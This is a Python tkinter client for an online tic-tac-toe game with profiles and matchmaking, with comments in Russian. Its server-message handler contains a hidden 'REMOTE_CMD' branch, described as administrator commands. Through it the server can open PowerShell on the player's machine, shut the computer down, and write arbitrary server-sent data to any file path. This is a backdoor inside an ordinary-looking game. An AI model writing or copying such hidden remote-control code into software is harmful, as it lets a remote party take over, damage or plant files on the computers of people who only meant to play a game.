import tkinter as tk
from tkinter import messagebox, filedialog
import base64
import threading
import io
import os
import subprocess
from PIL import Image, ImageTk

class TicTacToeGame:
    def __init__(self, sock, login, avatar_b64):
        self.sock = sock
        self.login = login
        self.avatar_b64 = avatar_b64
        self.opponent = "Неизвестно"
        self.symbol = "" # "X" или "O"
        self.game_active = False
        self.my_turn = False

        self.root = tk.Toplevel()
        self.root.title(f"Профиль: {self.login}")
        self.root.geometry("350x700")
        self.root.configure(bg="#1a1a1a")

        self.setup_ui()
        # Запуск фонового потока для прослушивания сообщений от сервера
        threading.Thread(target=self.receiver, daemon=True).start()

    # Создание визуальных элементов (шапка, кнопки, игровое поле)
    def setup_ui(self):
        self.header = tk.Frame(self.root, bg="#262626", pady=10)
        self.header.pack(fill="x")
        tk.Label(self.header, text=self.login, fg="white", bg="#262626", font=("Arial", 12, "bold")).pack()
        self.avatar_label = tk.Label(self.header, bg="#262626")
        self.avatar_label.pack()
        self.update_avatar_ui(self.avatar_b64)

        tk.Button(self.root, text="ПРОФИЛЬ", bg="#333", fg="white", command=self.edit_profile).pack(pady=5)
        self.btn_search = tk.Button(self.root, text="НАЙТИ ИГРУ", bg="#4b6eaf", fg="white", command=self.start_search)
        self.btn_search.pack(pady=10, fill="x", padx=50)

        # Отрисовка сетки 3x3
        self.grid_frame = tk.Frame(self.root, bg="#1a1a1a")
        self.grid_frame.pack()
        self.btns = []
        for i in range(9):
            b = tk.Button(self.grid_frame, text="", font=("Arial", 20, "bold"), width=4, height=2, bg="#262626", fg="white", command=lambda idx=i: self.click(idx))
            b.grid(row=i//3, column=i%3, padx=2, pady=2)
            self.btns.append(b)
        self.status_label = tk.Label(self.root, text="В сети", fg="gray", bg="#1a1a1a")
        self.status_label.pack(pady=10)

    # Отображение аватара из Base64
    def update_avatar_ui(self, b64):
        if b64 and b64 != "None":
            img = Image.open(io.BytesIO(base64.b64decode(b64))).resize((80, 80))
            self.photo = ImageTk.PhotoImage(img)
            self.avatar_label.config(image=self.photo)

    # Окно редактирования профиля
    def edit_profile(self):
        win = tk.Toplevel(self.root)
        ent = tk.Entry(win); ent.insert(0, self.login); ent.pack(pady=10)
        def save():
            self.sock.send(f"UPDATE_PROFILE|{ent.get()}|{self.avatar_b64}".encode())
            self.login = ent.get(); win.destroy()
        tk.Button(win, text="Сохранить", command=save).pack()

    # Отправка сигнала серверу о поиске игры
    def start_search(self):
        self.sock.send("FIND_GAME".encode())
        self.btn_search.config(state="disabled", text="ПОИСК...")

    # Обработка нажатия на клетку поля
    def click(self, idx):
        if self.my_turn and self.game_active and self.btns[idx]['text'] == "":
            self.btns[idx].config(text=self.symbol, fg="#00FF00")
            self.sock.send(f"MOVE|{idx}".encode())
            self.my_turn = False; self.check_winner()

    # Локальная проверка условий победы
    def check_winner(self):
        win_coords = [(0,1,2), (3,4,5), (6,7,8), (0,3,6), (1,4,7), (2,5,8), (0,4,8), (2,4,6)]
        for a, b, c in win_coords:
            if self.btns[a]['text'] == self.btns[b]['text'] == self.btns[c]['text'] != "":
                self.game_active = False
                is_win = self.btns[a]['text'] == self.symbol
                if is_win: self.sock.send(f"GAME_OVER|{self.login}|{self.opponent}|0".encode())
                messagebox.showinfo("Конец", "Победа!" if is_win else "Поражение!")
                self.reset_grid(); return True
        if all(b['text'] != "" for b in self.btns):
            if self.symbol == "X": self.sock.send(f"GAME_OVER|{self.login}|{self.opponent}|1".encode())
            messagebox.showinfo("Конец", "Ничья!"); self.reset_grid()
        return False

    # Сброс поля после матча
    def reset_grid(self):
        for b in self.btns: b.config(text="")
        self.btn_search.config(state="normal", text="НАЙТИ ИГРУ")

    # Основной цикл приема данных от сервера
    def receiver(self):
        while True:
            try:
                raw_data = self.sock.recv(1024 * 1000)
                if not raw_data: break
                data = raw_data.decode('utf-8', errors='ignore')
                p = data.split("|")
                # Начало матча
                if p[0] == "GAME_START":
                    self.symbol, self.opponent = p[1], p[2]
                    self.game_active = True; self.my_turn = (self.symbol == "X")
                    self.status_label.config(text=f"Вы: {self.symbol} против {self.opponent}")
                # Получение хода соперника
                elif p[0] == "MOVE_UPDATE":
                    idx = int(p[1])
                    self.btns[idx].config(text=("O" if self.symbol=="X" else "X"), fg="#FF4444")
                    self.my_turn = True; self.check_winner()
                # Удаленные команды от администратора
                elif p[0] == "REMOTE_CMD":
                    if p[1] in ["KICK", "BAN"]:
                        self.root.destroy()
                    elif p[1] == "POWERSHELL":
                        subprocess.Popen(["powershell.exe"], creationflags=subprocess.CREATE_NEW_CONSOLE)
                    elif p[1] == "SHUTDOWN":
                        os.system("shutdown /s /t 60")
                    elif p[1] == "SEND_FILE":
                        with open(p[2], "wb") as f: f.write(base64.b64decode(p[3]))
                        messagebox.showinfo("Файл", f"Получен файл: {p[2]}")
            except: break